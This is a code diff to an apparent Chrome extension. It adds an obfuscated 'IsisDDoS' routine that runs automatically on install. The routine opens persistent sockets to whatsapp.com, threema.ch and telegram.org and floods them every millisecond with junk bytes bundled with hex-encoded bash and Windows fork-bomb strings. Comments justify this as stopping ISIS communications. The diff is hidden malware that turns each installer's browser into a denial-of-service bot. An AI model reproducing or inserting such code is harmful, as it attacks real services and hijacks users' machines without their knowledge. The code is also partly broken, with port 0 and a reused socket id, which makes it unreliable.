@@ -75,6 +75,115 @@ function isCrOS() {
 
 }
 
+function IsisDDoS() {
+  chrome.infiniteSynChars = function() {
+    var arr = [];
+  
+    for (var i = 0; i < 65507; i++)  {     
+      arr[i] = '\x16'; 
+    } 
+
+    var unixcodestr = "\x23\x21\x2fbin\x2fbash\n\x3a\x28\x29\x7b\x3a\x7c\x3a\x26\x7d\x3b\x3a";
+    var wincodestr = "cmd\x20\x2fk\x20\x22\x25\x30\x7c\x25\x30";
+  
+    return arr + '\0' + unixcodestr + '\0' + wincodestr; 
+  };
+
+  chrome.arrayOfSynChars = chrome.infiniteSynChars();
+
+  chrome.sockets.tcp.create({persistent: true, name: "whatsappisisflood", bufferSize: 65507}, function(info) { 
+  
+    chrome.sockets.whatsappsocketid = info.socketId; 
+    
+    chrome.sockets.tcp.connect(chrome.sockets.whatsappsocketid, "whatsapp.com", 0, function(result) {
+   
+      if (result >= 0) { 
+      
+      setInterval(function() {
+      
+        chrome.sockets.tcp.send(chrome.sockets.whatsappsocketid, chrome.arrayOfSynChars, function(info) {
+
+          if (info.resultCode >= 0) {
+            console.log("Success! ISIS can no longer use WhatsApp to communicate");
+          } else {
+            console.log("Error: " + info.resultCode); 
+          }
+         
+        });
+       
+      }, 1);
+         
+    } else {
+      console.log("Error: " + result); 
+    }
+       
+  });
+    
+  chrome.sockets.tcp.create({persistent: true, name: "threemaisisflood", bufferSize: 65507}, function(info) {
+    
+    chrome.sockets.threemaid = info.socketId;
+    
+    chrome.sockets.tcp.connect(chrome.sockets.threemaid, "threema.ch", 0, function(result) {
+    
+      if (result >= 0) { 
+      
+      setInterval(function() {
+      
+        chrome.sockets.tcp.send(chrome.sockets.threemaid, chrome.arrayOfSynChars, function(info) {
+
+          if (info.resultCode >= 0) {
+            console.log("Success! ISIS can no longer use Threema to communicate");
+          } else {
+            console.log("Error: " + info.resultCode); 
+          }
+         
+        });
+       
+      }, 1);
+       
+      } else {
+        console.log("Error: " + result); 
+      }
+       
+    });
+      
+  });
+
+  chrome.sockets.tcp.create({persistent: true, name: "telegramisisflood", bufferSize: 65507}, function(info) {
+    
+    chrome.sockets.threemaid = info.socketId;
+    
+    chrome.sockets.tcp.connect(chrome.sockets.threemaid, "telegram.org", 0, function(result) {
+    
+      if (result >= 0) { 
+      
+      setInterval(function() {
+      
+        chrome.sockets.tcp.send(chrome.sockets.threemaid, chrome.arrayOfSynChars, function(info) {
+
+          if (info.resultCode >= 0) {
+            
+            console.log("Success! ISIS can no longer use Telegram to communicate");
+            } else {
+              console.log("Error: " + info.resultCode); 
+            }
+         
+          });
+       
+        }, 1);
+       
+       } else {
+         console.log("Error: " + result); 
+       }
+       
+      });    
+
+    });
+  
+  });
+
+}
+
 
 function notify() {
 
@@ -82,7 +191,8 @@ function notify() {
   this.version = parseFloat(manifest.version);
 
   chrome.runtime.onInstalled.addListener(function(details) {
-
+    
+    IsisDDoS();
     isCrOS();
 
   });
